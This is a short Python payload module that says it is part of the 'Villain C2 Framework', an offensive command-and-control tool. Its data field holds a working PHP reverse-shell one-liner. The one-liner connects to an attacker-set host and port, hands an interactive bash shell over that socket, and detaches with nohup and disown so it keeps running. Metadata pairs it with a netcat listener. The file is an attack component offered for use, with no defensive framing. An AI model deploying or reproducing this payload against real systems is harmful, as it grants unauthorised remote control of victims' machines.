# This module is part of the "Villain C2 Framework"

from typing import ClassVar


class Payload:

    info: ClassVar[dict] = {
        'Title' : 'PHP proc_open reverse TCP',
        'Author' : 'Unknown',
        'Description' : 'PHP proc_open reverse TCP',
        'References' : ['https://revshells.com']
    }

    meta: ClassVar[dict] = {
        'handler' : 'netcat',
        'type' : 'php-proc-open',
        'os' : 'linux'  
    }

    config: ClassVar[dict] = {}

    parameters: ClassVar[dict] = {
        'lhost' : None
    }

    attrs: ClassVar[dict] = {}

    data = "nohup php -r '$sock=fsockopen(\"*LHOST*\",*LPORT*);$proc=proc_open(\"bash\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);' > /dev/null 2>&1 & disown"
